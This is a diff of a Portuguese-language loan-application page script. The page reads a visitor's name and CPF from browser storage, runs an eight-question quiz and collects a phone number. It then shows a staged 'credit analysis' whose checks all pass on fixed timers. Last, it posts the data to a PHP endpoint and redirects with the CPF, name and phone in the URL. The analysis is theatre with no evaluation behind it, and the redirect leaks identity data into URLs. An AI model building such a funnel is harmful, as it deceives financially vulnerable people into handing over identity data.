@@ -675,385 +675,361 @@
   </div>
 
   <script>
-    document.addEventListener("DOMContentLoaded", function () {
-      // Verificar se temos os dados da API no localStorage
-      const dadosUsuarioJSON = localStorage.getItem("dadosUsuario");
-      if (!dadosUsuarioJSON) {
-        console.error("Dados do usuário não encontrados no localStorage");
-        alert(
-          "Dados do usuário não encontrados. Você será redirecionado para o início."
-        );
-        window.location.href = "./index.html";
-        return;
-      }
+  document.addEventListener("DOMContentLoaded", function () {
+    // ========= FUNÇÃO CENTRAL PARA PEGAR OS DADOS DO USUÁRIO DA API =========
+    function obterDadosUsuario() {
+      const chavesLocalStorage = ["dadosUsuario", "userData"]; // as duas chaves usadas na outra página
 
-      // Tentar analisar os dados JSON
-      try {
-        const dadosUsuario = JSON.parse(dadosUsuarioJSON);
-        if (!dadosUsuario.nome || !dadosUsuario.cpf) {
-          console.error("Dados do usuário incompletos:", dadosUsuario);
-          alert("Dados incompletos. Você será redirecionado para o início.");
-          window.location.href = "./index.html";
-          return;
+      for (const chave of chavesLocalStorage) {
+        const json = localStorage.getItem(chave);
+        if (!json) continue;
+
+        try {
+          const data = JSON.parse(json);
+
+          // Normaliza para sempre termos .nome e .cpf disponíveis
+          const nome = data.nome || data.NOME || "";
+          const cpf =
+            (data.cpf || data.CPF || "").toString(); // garante string
+
+          if (nome && cpf) {
+            return {
+              ...data,
+              nome,
+              cpf,
+            };
+          }
+        } catch (e) {
+          console.error("Erro ao analisar dados do usuário em", chave, e);
         }
-        console.log(
-          "Dados do usuário válidos encontrados:",
-          dadosUsuario.nome,
-          dadosUsuario.cpf
-        );
-
-        // Limpar quaisquer outros valores salvos no localStorage que possam interferir
-        // Remover valores antigos para evitar conflitos
-        localStorage.removeItem("nomeCompleto");
-        localStorage.removeItem("cpfUsuario");
-      } catch (error) {
-        console.error("Erro ao analisar dados do usuário:", error);
-        alert(
-          "Erro ao processar seus dados. Você será redirecionado para o início."
-        );
-        window.location.href = "./index.html";
-        return;
       }
 
-      // Elementos do Quiz
-      const progressBar = document.getElementById("progressBar");
-      const progressText = document.getElementById("progressText");
-      const btnNext = document.getElementById("btnNext");
-      const btnSolicitar = document.getElementById("btnSolicitar");
-      const btnVoltar = document.getElementById("btnVoltar");
-      const btnConfirmarTelefone = document.getElementById(
-        "btnConfirmarTelefone"
+      return null;
+    }
+
+    // Verificar se temos os dados da API no localStorage (já normalizados)
+    const dadosUsuarioInicial = obterDadosUsuario();
+    if (!dadosUsuarioInicial) {
+      console.error("Dados do usuário não encontrados no localStorage");
+      alert(
+        "Dados do usuário não encontrados. Você será redirecionado para o início."
       );
+      window.location.href = "./index.html";
+      return;
+    }
 
-      // Estado do quiz
-      let currentQuestion = 1;
-      const totalQuestions = 8;
-      const userAnswers = {};
-      let telefone = "";
-      let nomeCompleto = "";
-      let cpfUsuario = "";
-      let analysisStarted = false; // Flag para controlar o início da análise
+    console.log(
+      "Dados do usuário válidos encontrados:",
+      dadosUsuarioInicial.nome,
+      dadosUsuarioInicial.cpf
+    );
 
-      // Atualizar progresso
-      function updateProgress() {
-        const progress = (currentQuestion / totalQuestions) * 100;
-        progressBar.style.width = `${progress}%`;
-        progressText.textContent = `${currentQuestion}/${totalQuestions}`;
-      }
+    // Limpar valores antigos que possam atrapalhar
+    localStorage.removeItem("nomeCompleto");
+    localStorage.removeItem("cpfUsuario");
 
-      // Iniciar sequência de análise
-      function startAnalysis() {
-        // Evitar que a análise inicie mais de uma vez
-        if (analysisStarted) return;
-        analysisStarted = true;
+    // Elementos do Quiz
+    const progressBar = document.getElementById("progressBar");
+    const progressText = document.getElementById("progressText");
+    const btnNext = document.getElementById("btnNext");
+    const btnSolicitar = document.getElementById("btnSolicitar");
+    const btnVoltar = document.getElementById("btnVoltar");
+    const btnConfirmarTelefone = document.getElementById(
+      "btnConfirmarTelefone"
+    );
 
-        const loadingBar = document.getElementById("loadingProgressBar");
+    // Estado do quiz
+    let currentQuestion = 1;
+    const totalQuestions = 8;
+    const userAnswers = {};
+    let telefone = "";
+    let nomeCompleto = "";
+    let cpfUsuario = "";
+    let analysisStarted = false; // Flag para controlar o início da análise
 
-        // Inicializar barra de progresso
-        loadingBar.style.width = "0%";
+    // Atualizar progresso
+    function updateProgress() {
+      const progress = (currentQuestion / totalQuestions) * 100;
+      progressBar.style.width = `${progress}%`;
+      progressText.textContent = `${currentQuestion}/${totalQuestions}`;
+    }
 
-        // Etapa 1: Verificar score (0-20%)
+    // Iniciar sequência de análise
+    function startAnalysis() {
+      if (analysisStarted) return;
+      analysisStarted = true;
+
+      const loadingBar = document.getElementById("loadingProgressBar");
+      loadingBar.style.width = "0%";
+
+      setTimeout(() => {
+        document.getElementById("statusScore").innerHTML =
+          '<i class="fas fa-check-circle text-green-500"></i>';
+        loadingBar.style.width = "20%";
+
         setTimeout(() => {
-          document.getElementById("statusScore").innerHTML =
+          document.getElementById("statusLimite").innerHTML =
             '<i class="fas fa-check-circle text-green-500"></i>';
-          loadingBar.style.width = "20%";
+          loadingBar.style.width = "40%";
 
-          // Etapa 2: Consultar limite (20-40%)
           setTimeout(() => {
-            document.getElementById("statusLimite").innerHTML =
+            document.getElementById("statusBeneficios").innerHTML =
               '<i class="fas fa-check-circle text-green-500"></i>';
-            loadingBar.style.width = "40%";
+            loadingBar.style.width = "60%";
 
-            // Etapa 3: Analisar benefícios (40-60%)
             setTimeout(() => {
-              document.getElementById("statusBeneficios").innerHTML =
+              document.getElementById("statusRendimentos").innerHTML =
                 '<i class="fas fa-check-circle text-green-500"></i>';
-              loadingBar.style.width = "60%";
+              loadingBar.style.width = "80%";
 
-              // Etapa 4: Calcular rendimentos (60-80%)
               setTimeout(() => {
-                document.getElementById("statusRendimentos").innerHTML =
+                document.getElementById("statusAprovacao").innerHTML =
                   '<i class="fas fa-check-circle text-green-500"></i>';
-                loadingBar.style.width = "80%";
+                loadingBar.style.width = "100%";
 
-                // Etapa 5: Processar aprovação (80-100%)
                 setTimeout(() => {
-                  document.getElementById("statusAprovacao").innerHTML =
-                    '<i class="fas fa-check-circle text-green-500"></i>';
-                  loadingBar.style.width = "100%";
+                  document
+                    .getElementById("analysisScreen")
+                    .classList.add("hidden");
+                  document
+                    .getElementById("quizResult")
+                    .classList.remove("hidden");
+                  progressText.textContent = "Concluído";
 
-                  // Após terminar todas as etapas, mostrar resultado
-                  setTimeout(() => {
-                    document
-                      .getElementById("analysisScreen")
-                      .classList.add("hidden");
-                    document
-                      .getElementById("quizResult")
-                      .classList.remove("hidden");
-                    progressText.textContent = "Concluído";
-
-                    // Mostrar botão de solicitar
-                    btnSolicitar.classList.remove("hidden");
-                  }, 700);
-                }, 1200);
+                  btnSolicitar.classList.remove("hidden");
+                }, 700);
               }, 1200);
             }, 1200);
           }, 1200);
-        }, 1000);
-      }
+        }, 1200);
+      }, 1000);
+    }
 
-      // Avançar para a próxima pergunta
-      function goToNextQuestion() {
-        // Ocultar pergunta atual
-        const currentQuestionEl = document.getElementById(
-          `question${currentQuestion}`
+    // Avançar para a próxima pergunta
+    function goToNextQuestion() {
+      const currentQuestionEl = document.getElementById(
+        `question${currentQuestion}`
+      );
+      currentQuestionEl.classList.add("hidden");
+
+      if (currentQuestion < totalQuestions) {
+        currentQuestion++;
+        document
+          .getElementById(`question${currentQuestion}`)
+          .classList.remove("hidden");
+        updateProgress();
+      } else {
+        document.getElementById("analysisScreen").classList.remove("hidden");
+        progressBar.style.width = "100%";
+        progressText.textContent = "Analisando";
+
+        setTimeout(startAnalysis, 300);
+      }
+    }
+
+    // Selecionar opção (avança automaticamente)
+    document.querySelectorAll(".quiz-option").forEach((option) => {
+      option.addEventListener("click", function () {
+        const questionNumber = this.getAttribute("data-question");
+        const questionEl = document.getElementById(
+          `question${questionNumber}`
         );
-        currentQuestionEl.classList.add("hidden");
 
-        if (currentQuestion < totalQuestions) {
-          // Mostrar próxima pergunta
-          currentQuestion++;
-          document
-            .getElementById(`question${currentQuestion}`)
-            .classList.remove("hidden");
-          updateProgress();
-        } else {
-          // Mostrar tela de análise
-          document
-            .getElementById("analysisScreen")
-            .classList.remove("hidden");
-          progressBar.style.width = "100%";
-          progressText.textContent = "Analisando";
+        questionEl.querySelectorAll(".quiz-option").forEach((opt) => {
+          opt.classList.remove("selected");
+          opt.querySelector(".option-selected").classList.add("hidden");
+        });
 
-          // Iniciar análise com um pequeno delay para garantir que a tela seja renderizada primeiro
-          setTimeout(startAnalysis, 300);
-        }
+        this.classList.add("selected");
+        this.querySelector(".option-selected").classList.remove("hidden");
+
+        const answerValue = this.getAttribute("data-value");
+        userAnswers[questionNumber] = answerValue;
+
+        setTimeout(() => {
+          goToNextQuestion();
+        }, 300);
+      });
+    });
+
+    // Botão de confirmar telefone
+    btnConfirmarTelefone.addEventListener("click", function () {
+      const telefoneInput = document.getElementById("telefoneInput");
+      if (!telefoneInput.value) {
+        alert("Por favor, informe seu telefone para continuar.");
+        return;
       }
 
-      // Selecionar opção (agora avança automaticamente)
-      document.querySelectorAll(".quiz-option").forEach((option) => {
-        option.addEventListener("click", function () {
-          const questionNumber = this.getAttribute("data-question");
-          const questionEl = document.getElementById(
-            `question${questionNumber}`
+      telefone = telefoneInput.value;
+      goToNextQuestion();
+    });
+
+    // Botão Solicitar Liberação
+    btnSolicitar.addEventListener("click", function () {
+      console.clear();
+
+      const telefoneFormatado = telefone.replace(/\D/g, "");
+      if (!telefoneFormatado || telefoneFormatado.length < 10) {
+        alert("Por favor, informe um telefone válido.");
+        return;
+      }
+
+      // Buscar de novo os dados normalizados (caso algo tenha mudado)
+      const dadosUsuario = obterDadosUsuario();
+      if (!dadosUsuario) {
+        console.error("Dados do usuário não encontrados no localStorage");
+        alert(
+          "Dados do usuário não encontrados. Por favor, reinicie o processo."
+        );
+        window.location.href = "./index.html";
+        return;
+      }
+
+      try {
+        console.log("Dados do usuário objeto:", dadosUsuario);
+
+        if (!dadosUsuario.cpf || !dadosUsuario.nome) {
+          console.error(
+            "Dados de CPF ou nome não encontrados:",
+            dadosUsuario
           );
-
-          // Desselecionar outras opções da mesma pergunta
-          questionEl.querySelectorAll(".quiz-option").forEach((opt) => {
-            opt.classList.remove("selected");
-            opt.querySelector(".option-selected").classList.add("hidden");
-          });
-
-          // Selecionar esta opção
-          this.classList.add("selected");
-          this.querySelector(".option-selected").classList.remove("hidden");
-
-          // Armazenar resposta
-          const answerValue = this.getAttribute("data-value");
-          userAnswers[questionNumber] = answerValue;
-
-          // Pequeno delay antes de avançar para dar feedback visual
-          setTimeout(() => {
-            goToNextQuestion();
-          }, 300);
-        });
-      });
-
-      // Botão de confirmar telefone
-      btnConfirmarTelefone.addEventListener("click", function () {
-        const telefoneInput = document.getElementById("telefoneInput");
-        if (!telefoneInput.value) {
-          alert("Por favor, informe seu telefone para continuar.");
-          return;
-        }
-
-        telefone = telefoneInput.value;
-        goToNextQuestion();
-      });
-
-      // Botão Solicitar Liberação
-      btnSolicitar.addEventListener("click", function () {
-        console.clear(); // Limpar console para facilitar o diagnóstico
-
-        // Obter telefone do formulário
-        const telefoneFormatado = telefone.replace(/\D/g, "");
-        if (!telefoneFormatado || telefoneFormatado.length < 10) {
-          alert("Por favor, informe um telefone válido.");
-          return;
-        }
-
-        // Obter dados diretamente do localStorage
-        const dadosUsuarioJSON = localStorage.getItem("dadosUsuario");
-        if (!dadosUsuarioJSON) {
-          console.error("Dados do usuário não encontrados no localStorage");
-          alert(
-            "Dados do usuário não encontrados. Por favor, reinicie o processo."
-          );
+          alert("Dados incompletos. Por favor, reinicie o processo.");
           window.location.href = "./index.html";
           return;
         }
 
-        try {
-          // Parse do JSON para objeto
-          const dadosUsuario = JSON.parse(dadosUsuarioJSON);
-          console.log("Dados do usuário objeto:", dadosUsuario);
+        const cpfLimpo = dadosUsuario.cpf.replace(/\D/g, "");
+        console.log("CPF (apenas números):", cpfLimpo);
+        console.log("Nome completo:", dadosUsuario.nome);
+        console.log("Telefone:", telefoneFormatado);
 
-          if (!dadosUsuario.cpf || !dadosUsuario.nome) {
-            console.error(
-              "Dados de CPF ou nome não encontrados:",
-              dadosUsuario
-            );
-            alert("Dados incompletos. Por favor, reinicie o processo.");
-            window.location.href = "./index.html";
-            return;
-          }
+        const mapearValorEmprestimo = {
+          "500-1000": "R$500 - R$1.000",
+          "1001-3000": "R$1.001 - R$3.000",
+          "3001-5000": "R$3.001 - R$5.000",
+          acima5000: "Acima de R$5.000",
+        };
 
-          // Formato limpo do CPF (apenas números)
-          const cpfLimpo = dadosUsuario.cpf.replace(/\D/g, "");
-          console.log("CPF (apenas números):", cpfLimpo);
-          console.log("Nome completo:", dadosUsuario.nome);
-          console.log("Telefone:", telefoneFormatado);
+        const mapearRendaFixa = {
+          "carteira-assinada": "Sim, carteira assinada",
+          autonomo: "Sim, autônomo",
+          "sem-renda": "Não tenho renda fixa",
+        };
 
-          // Mapear valores das respostas para valores mais legíveis
-          const mapearValorEmprestimo = {
-            "500-1000": "R$500 - R$1.000",
-            "1001-3000": "R$1.001 - R$3.000",
-            "3001-5000": "R$3.001 - R$5.000",
-            acima5000: "Acima de R$5.000",
-          };
+        const mapearSolicitouCredito = {
+          aprovado: "Sim, foi aprovado",
+          negado: "Sim, foi negado",
+          nao: "Não",
+        };
 
-          const mapearRendaFixa = {
-            "carteira-assinada": "Sim, carteira assinada",
-            autonomo: "Sim, autônomo",
-            "sem-renda": "Não tenho renda fixa",
-          };
+        const mapearFinalidadeCredito = {
+          "pagar-contas": "Pagar contas",
+          "investir-negocio": "Investir no próprio negócio",
+          "comprar-algo": "Comprar algo importante",
+          "uso-pessoal": "Uso pessoal",
+        };
 
-          const mapearSolicitouCredito = {
-            aprovado: "Sim, foi aprovado",
-            negado: "Sim, foi negado",
-            nao: "Não",
-          };
+        const dadosParaSalvar = {
+          nome: dadosUsuario.nome,
+          cpf: cpfLimpo,
+          telefone: telefoneFormatado,
+          valor_emprestimo: mapearValorEmprestimo[userAnswers["1"]] || "",
+          renda_fixa: mapearRendaFixa[userAnswers["2"]] || "",
+          negativado:
+            userAnswers["3"] === "sim"
+              ? "Sim"
+              : userAnswers["3"] === "nao"
+              ? "Não"
+              : "Não sei",
+          solicitou_credito: mapearSolicitouCredito[userAnswers["4"]] || "",
+          dia_vencimento: userAnswers["5"] ? "Dia " + userAnswers["5"] : "",
+          finalidade_credito:
+            mapearFinalidadeCredito[userAnswers["6"]] || "",
+          cartao_credito: userAnswers["7"] === "sim" ? "Sim" : "Não",
+        };
 
-          const mapearFinalidadeCredito = {
-            "pagar-contas": "Pagar contas",
-            "investir-negocio": "Investir no próprio negócio",
-            "comprar-algo": "Comprar algo importante",
-            "uso-pessoal": "Uso pessoal",
-          };
+        console.log("Dados para salvar:", dadosParaSalvar);
 
-          // Preparar dados para enviar ao servidor
-          const dadosParaSalvar = {
-            nome: dadosUsuario.nome,
-            cpf: cpfLimpo,
-            telefone: telefoneFormatado,
-            valor_emprestimo: mapearValorEmprestimo[userAnswers["1"]] || "",
-            renda_fixa: mapearRendaFixa[userAnswers["2"]] || "",
-            negativado:
-              userAnswers["3"] === "sim"
-                ? "Sim"
-                : userAnswers["3"] === "nao"
-                  ? "Não"
-                  : "Não sei",
-            solicitou_credito: mapearSolicitouCredito[userAnswers["4"]] || "",
-            dia_vencimento: userAnswers["5"] ? "Dia " + userAnswers["5"] : "",
-            finalidade_credito:
-              mapearFinalidadeCredito[userAnswers["6"]] || "",
-            cartao_credito: userAnswers["7"] === "sim" ? "Sim" : "Não",
-          };
+        fetch("./salvar_dados.php", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(dadosParaSalvar),
+        })
+          .then((response) => response.json())
+          .then((data) => {
+            console.log("Resposta do servidor:", data);
+            if (data.status === "error") {
+              console.error("Erro ao salvar dados:", data.message);
+            }
 
-          console.log("Dados para salvar:", dadosParaSalvar);
+            const urlAtual = new URLSearchParams(window.location.search);
+            const novaUrl = new URLSearchParams();
 
-          // Enviar dados para o servidor
-          fetch("./salvar_dados.php", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify(dadosParaSalvar),
+            for (const [chave, valor] of urlAtual.entries()) {
+              novaUrl.append(chave, valor);
+            }
+
+            novaUrl.set("cpf", cpfLimpo);
+            novaUrl.set("nome", dadosUsuario.nome);
+            novaUrl.set("numero", telefoneFormatado);
+
+            window.location.href = `./simulacao?${novaUrl.toString()}`;
           })
-            .then((response) => response.json())
-            .then((data) => {
-              console.log("Resposta do servidor:", data);
-              if (data.status === "error") {
-                console.error("Erro ao salvar dados:", data.message);
-              }
-              // Continuar redirecionamento independentemente da resposta
-              // Obter todos os parâmetros da URL atual
-              const urlAtual = new URLSearchParams(window.location.search);
+          .catch((error) => {
+            console.error("Erro na requisição:", error);
 
-              // Criar um novo objeto URLSearchParams para a nova URL
-              const novaUrl = new URLSearchParams();
+            const urlAtual = new URLSearchParams(window.location.search);
+            const novaUrl = new URLSearchParams();
 
-              // Adicionar todos os parâmetros atuais à nova URL
-              for (const [chave, valor] of urlAtual.entries()) {
-                novaUrl.append(chave, valor);
-              }
+            for (const [chave, valor] of urlAtual.entries()) {
+              novaUrl.append(chave, valor);
+            }
 
-              // Adicionar ou atualizar parâmetros específicos
-              novaUrl.set("cpf", cpfLimpo);
-              novaUrl.set("nome", dadosUsuario.nome);
-              novaUrl.set("numero", telefoneFormatado);
+            novaUrl.set("cpf", cpfLimpo);
+            novaUrl.set("nome", dadosUsuario.nome);
+            novaUrl.set("numero", telefoneFormatado);
 
-              // Redirecionar para a página de simulação com todos os parâmetros
-              window.location.href = `./simulacao?${novaUrl.toString()}`;
-            })
-            .catch((error) => {
-              console.error("Erro na requisição:", error);
-              // Obter todos os parâmetros da URL atual
-              const urlAtual = new URLSearchParams(window.location.search);
-
-              // Criar um novo objeto URLSearchParams para a nova URL
-              const novaUrl = new URLSearchParams();
-
-              // Adicionar todos os parâmetros atuais à nova URL
-              for (const [chave, valor] of urlAtual.entries()) {
-                novaUrl.append(chave, valor);
-              }
-
-              // Adicionar ou atualizar parâmetros específicos
-              novaUrl.set("cpf", cpfLimpo);
-              novaUrl.set("nome", dadosUsuario.nome);
-              novaUrl.set("numero", telefoneFormatado);
-
-              // Redirecionar para a página de simulação com todos os parâmetros
-              window.location.href = `./simulacao?${novaUrl.toString()}`;
-            });
-        } catch (error) {
-          console.error("Erro ao processar dados:", error);
-          alert("Erro ao processar dados. Por favor, reinicie o processo.");
-          window.location.href = "./index.html";
-        }
-      });
-
-      // Botão Voltar
-      btnVoltar.addEventListener("click", function () {
-        window.history.back();
-      });
-
-      // Inicializar progresso
-      updateProgress();
-
-      // Mascara para o telefone
-      const telefoneInput = document.getElementById("telefoneInput");
-      if (telefoneInput) {
-        telefoneInput.addEventListener("input", function (e) {
-          let value = e.target.value.replace(/\D/g, "");
-          if (value.length > 11) value = value.substring(0, 11);
-
-          if (value.length > 2 && value.length <= 6) {
-            value = `(${value.substring(0, 2)}) ${value.substring(2)}`;
-          } else if (value.length > 6) {
-            value = `(${value.substring(0, 2)}) ${value.substring(
-              2,
-              7
-            )}-${value.substring(7)}`;
-          }
-
-          e.target.value = value;
-        });
+            window.location.href = `./simulacao?${novaUrl.toString()}`;
+          });
+      } catch (error) {
+        console.error("Erro ao processar dados:", error);
+        alert("Erro ao processar dados. Por favor, reinicie o processo.");
+        window.location.href = "./index.html";
       }
     });
-  </script>
+
+    // Botão Voltar
+    btnVoltar.addEventListener("click", function () {
+      window.history.back();
+    });
+
+    // Inicializar progresso
+    updateProgress();
+
+    // Máscara para o telefone
+    const telefoneInput = document.getElementById("telefoneInput");
+    if (telefoneInput) {
+      telefoneInput.addEventListener("input", function (e) {
+        let value = e.target.value.replace(/\D/g, "");
+        if (value.length > 11) value = value.substring(0, 11);
+
+        if (value.length > 2 && value.length <= 6) {
+          value = `(${value.substring(0, 2)}) ${value.substring(2)}`;
+        } else if (value.length > 6) {
+          value = `(${value.substring(0, 2)}) ${value.substring(
+            2,
+            7
+          )}-${value.substring(7)}`;
+        }
+
+        e.target.value = value;
+      });
+    }
+  });
+</script>
+
 
 <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
 
